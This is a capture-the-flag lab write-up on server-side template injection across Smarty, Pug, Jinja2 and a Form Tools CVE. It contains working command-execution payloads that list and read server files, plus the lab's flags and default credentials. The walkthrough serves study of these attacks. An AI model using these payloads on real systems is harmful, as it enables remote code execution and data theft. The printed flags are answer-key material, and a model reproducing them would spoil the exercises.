Here's i will show the task of that lab.

In task 4 we have some task to do.
Here's are the question: What is the content of the hidden text file in the server directory?

First what we need to do is go that page, http://ssti.thm:8000/smarty/ but do not forget to add the domain into your /etc/hosts like: echo "10.10.10.10 ssti.thm" >> /etc/hosts, you need to be a root.

This is a simply page, we need to cat hidden text file

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/8d795bc5-43d3-48fa-9b42-41a65170c107)

In the searchbar wrote that to list all files in that directory, ```{system("ls")}```. We can see text file, with random numbers, look below.

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/1a9cca5a-96b5-457d-a684-800caf4f4f75)

to cat file, just use that command ```{system("cat 7c45b2d3a741398826f497d58b73a401.txt index.php")}``` and that command will show us the flag.
THM{0739eea78f5c7f4b1690737c6258e38b} 

Task 5: NodeJS - Pug
Here's are othere simply task to do: What is the content of the hidden text file in the server directory?
Go to that page: http://ssti.thm:8001/jade/

Like in previous task, also are there simply page.
by this command we can list all files: 
```#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}```
here's are the results of that command:

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/1d0713ba-8a90-4e9c-9aae-a0e0c0e3cede)

Now we need to use cat, to check what's inside that text file.
```#{root.process.mainModule.require('child_process').spawnSync('cat', ['7f58571b42d8c477a2f3efa69a681ac3.txt']).stdout}``` if you wanna know how's it work, you should check that task, there is a lot of more description of that comand.
Here's are the results of that command:

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/87ec96c0-fdf4-4f90-a558-91ffc2c608fe)


Go to the next task,
Python - Jinja2, go to that page:  http://ssti.thm:8002/jinja2/
To identify what's that engine is running you can check by this, if the results be 49, you will know that is a jinja2.
```{{7*7}}```

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/f59420bc-a9d8-4a80-8798-b476b0b40e36)

now we need to somehow list all files in the directory.
Here's are the command to make that real :D ```{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls'])}}```
Below's are the results of that command:

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/c1299694-70f5-4d0b-8cd6-508005455ce8)

By that command, you will what's inside that file.
```Here's are the command to make that real :D ```{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', '5d8bea6df83cbb6767a235c4ba54933b.txt'])}}```
That's a flage: THM{ecc43642dd6934d37c69598174e6e126}

We will skip the next one task: Automating the Exploitation, do by your self this sutomating tools :)

Task 8 Extra-Mile Challenge go to that page: http://ssti.thm:8080/ the credentials are username: admin, password: admin
i will how make that vuln by manual, also here's are the CVE number to dip in it, to learn how's its work CVE-2024-22637
Here's are description of that CVE: ```Server Side Template Injection (SSTI) vulnerability in Form Tools 3.1.1 allows attackers to run arbitrary commands via the Group Name field under the add forms section of the application.```

First what we need to do is, go add forms
We will see 3 buttons, as below: 

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/05054ab8-538e-480c-be28-d9efc06d8bce)

select the internal, wrote some random form name like: admin, then click add form above you can see main,fields,views etc.. go to views and you will see view group.

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/b19bfeb8-ffec-4280-a375-ce5f1d7219b0)

try ```{{7*7}}``` and you will 49, thats a proof that there is a SSTI, our task is to did: What is the content of the hidden text file in the server directory?
let's try ```{system("ls")}```the output of it is: index.phppage_edit_email.phppage_edit_view.phppage_email_settings.phppage_emails.phppage_fields.phppage_main.phppage_public_form_omit_list.phppage_public_view_omit_list.phppage_views.phppage_views.php

comply nothing intresting, try that command ```{system('ls /var/www/html')}``` and there is some text file: 105e15924c1e41bf53ea64afa0fa72b2.txtLICENSE.txtadmincacheclientserror.phpforget_password.phpglobalindex.phpinstallmodulesprocess.phpreactthemesuploadvendorvendor

Let's cat that file by this command: ```{system("cat /var/www/html/105e15924c1e41bf53ea64afa0fa72b2.txt")}``` and u will get that flag, as below:

![image](https://github.com/Anogota/Server-side-Template-Injection/assets/143951834/1541b985-ca3b-4aee-ad55-ded5ad477f00)

That's it, i hope i helped you
